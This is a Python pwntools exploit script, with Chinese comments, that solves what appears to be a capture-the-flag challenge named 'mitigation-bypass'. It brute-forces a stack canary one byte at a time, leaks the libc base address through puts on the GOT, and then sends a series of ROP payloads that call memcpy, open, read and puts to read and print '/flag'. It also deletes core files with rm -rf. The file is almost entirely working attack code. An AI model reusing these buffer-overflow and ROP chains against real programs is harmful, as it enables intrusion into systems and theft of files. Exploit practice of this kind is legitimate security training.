#!/usr/bin/env python

import os
from pwn import *

# context.log_level = "debug"

proc = process("/challenge/mitigation-bypass")
# proc = process("./mitigation-bypass")

payload0 = cyclic(0x68)  # buf
# byte_by_byte爆破stack_canary
for i in range(8):
    for stack_canary in range(0x100):
        tmp_payload = payload0 + stack_canary.to_bytes(1, byteorder="little")
        proc.sendafter(b"Input something to pwn me :)\n", tmp_payload)
        line = proc.recvline()
        if (line == b"have fun\n"):
            # 猜中了一位，继续下一位
            print("{} byte : {}".format(i, hex(stack_canary)))
            payload0 += stack_canary.to_bytes(1, byteorder="little")
            break

print(payload0)
print(hex(len(payload0)))
payload0 += cyclic(0x8)  # saved_rbp

# 利用core得到libc加载地址 不可行
# for core_path in os.listdir():
#     if (core_path.startswith("core.")):
#         if (os.path.getsize(core_path) != 0):
#             break
# core_elf = ELF(core_path)
# libc_seg = core_elf.segments[6] # 看内存可以看出来libc在第6段
# libc_base = libc_seg.header["p_vaddr"]
# print("libc addr : ", hex(libc_base))
os.system("rm -rf core.*")

# 利用puts输出got表，泄漏出libc地址
pop_rdi_addr = 0x4013e3 # pop rdi; ret
puts_addr = 0x4010C0
puts_got_addr = 0x404020
libc_puts_offset = 0x84420
read_input_addr = 0x4012A2

payload = payload0
payload += p64(pop_rdi_addr)
payload += p64(puts_got_addr) # rdi = puts_got

payload += p64(puts_addr) # puts(puts_got)

payload += p64(read_input_addr)
proc.sendafter(b"Input something to pwn me :)\n", payload)
data = proc.readline()[:-1]
print(data)
libc_base = int.from_bytes(data, byteorder="little") - libc_puts_offset
print("libc addr : ", hex(libc_base))

# gadgets
buf_offset = 0x1ec780
slash_str_offset = 0x0c10 # "/\x00\x00\x00\x00\x00"
flag_str_offset = 0x1b1de0 # "flags"

pop_rdi_offset = 0x23b6a # pop rdi; ret
pop_rsi_offset = 0x2601f # pop rsi; ret
pop_rdx_offset = 0x142c92 # pop rdx; ret
ret_offset = 0x23b6b # ret

open_offset = 0x10dce0
read_offset = 0x10dfc0
write_offset = 0x10e060
memcpy_offset = 0xbbad0
puts_offset = 0x84420


# 由于长度有限，需要多次打入payload

# 第一步，将'/'复制到缓冲区
payload = payload0
payload += p64(pop_rdx_offset+libc_base)
payload += p64(0x4) # rdx=4

payload += p64(pop_rsi_offset+libc_base)
payload += p64(slash_str_offset+libc_base) # rsi="/\x00\x00\x00\x00\x00"

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base) # rdi=buf

payload += p64(memcpy_offset+libc_base) # memcpy(buf, "/\x00\x00\x00\x00\x00", 4)

payload += p64(read_input_addr)
proc.sendafter(b"Input something to pwn me :)\n", payload)

# 第二步，将'flag'复制到缓冲区 拼接'/flag'
payload = payload0
payload += p64(pop_rdx_offset+libc_base)
payload += p64(0x4) # rdx=4

payload += p64(pop_rsi_offset+libc_base)
payload += p64(flag_str_offset+libc_base) # rsi="flags"

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base+1) # rdi=buf+1

payload += p64(memcpy_offset+libc_base) # memcpy(buf+1, "flags", 4)

payload += p64(read_input_addr)
proc.sendafter(b"Input something to pwn me :)\n", payload)

# 第三步 open flag
payload = payload0
payload += p64(pop_rsi_offset+libc_base)
payload += p64(0)   # rsi=0

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base)    # rdi=buf

payload += p64(open_offset+libc_base)   # open('/flag', 0)

payload += p64(read_input_addr)
proc.sendafter(b"Input something to pwn me :)\n", payload)

# 第四步 read flag到buf
payload = payload0

payload += p64(pop_rdx_offset+libc_base)
payload += p64(0x100) # rdx=0x100

payload += p64(pop_rsi_offset+libc_base)
payload += p64(buf_offset+libc_base) # rsi=buf

payload += p64(pop_rdi_offset+libc_base)
payload += p64(3) # rdi=3

payload += p64(read_offset+libc_base) # read(3, buf, 0x100)

payload += p64(read_input_addr)
proc.sendafter(b"Input something to pwn me :)\n", payload)

# 第五步 puts buf
payload = payload0
payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base) # rdi = buf

payload += p64(puts_offset+libc_base) # puts(buf)

payload += p64(read_input_addr)
proc.sendafter(b"Input something to pwn me :)\n", payload)


flag = proc.recvline()
print("flag: ", flag.decode())